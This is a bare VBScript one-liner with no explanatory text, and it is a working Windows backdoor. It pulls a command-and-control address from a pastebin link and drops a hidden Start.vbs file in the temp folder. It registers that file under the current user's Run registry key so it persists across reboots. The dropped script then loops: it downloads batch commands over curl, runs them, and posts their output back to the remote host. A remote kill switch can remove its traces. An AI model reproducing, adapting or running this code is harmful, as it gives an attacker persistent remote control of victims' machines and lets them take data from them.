On Error Resume Next:Set objFSO = CreateObject("Scripting.FileSystemObject"):objFSO.DeleteFile CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%") & "\.vbs":Set oHTTP = CreateObject("MSXML2.XMLHTTP"):oHTTP.open "GET", "https://pastebin.com/raw/knWXwasC", False:oHTTP.send:tunnel = oHTTP.responseText:If InStr(tunnel, "hold") > 0 Then:WScript.Quit:End If:tempPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%") & "\Start.vbs":Set objFile = objFSO.CreateTextFile(tempPath, True):objFile.WriteLine "On Error Resume Next:Set oHTTP = CreateObject(""MSXML2.XMLHTTP""):Set objShell = CreateObject(""WScript.Shell""):Do While True:oHTTP.open ""GET"", ""https://pastebin.com/raw/knWXwasC"", False:oHTTP.send:tunnel = oHTTP.responseText:If InStr(tunnel, ""kill"") > 0 Then:CreateObject(""Scripting.FileSystemObject"").DeleteFile(""" & tempPath & """), True:objShell.Run ""reg delete """"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"""" /v """"Start"""" /f"", 0, True:WScript.Quit:End If:sh = ""@echo off&cd %userprofile%&cmd /V:ON /C """"SET ip="" & tunnel & ""&&SET sid=""""Authorization: ac3b22bb-4baa2f93-341bd899""""&&SET protocol=http://&&curl !protocol!!ip!/ac3b22bb -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/4baa2f93 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl !protocol!!ip!/341bd899 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1"""" > NUL"":objShell.Run ""cmd /C "" & sh, 0, True:WScript.Sleep 5000:Loop:On Error Goto 0":objFile.Close:Set objShell = CreateObject("WScript.Shell"):objShell.Run "reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"" /v ""Start"" /t REG_SZ /d ""%TEMP%\Start.vbs"" /f", 0, True:objFSO.GetFile(tempPath).Attributes = objFSO.GetFile(tempPath).Attributes Or 3:objShell.Run "%TEMP%\Start.vbs", 0, False:On Error Goto 0
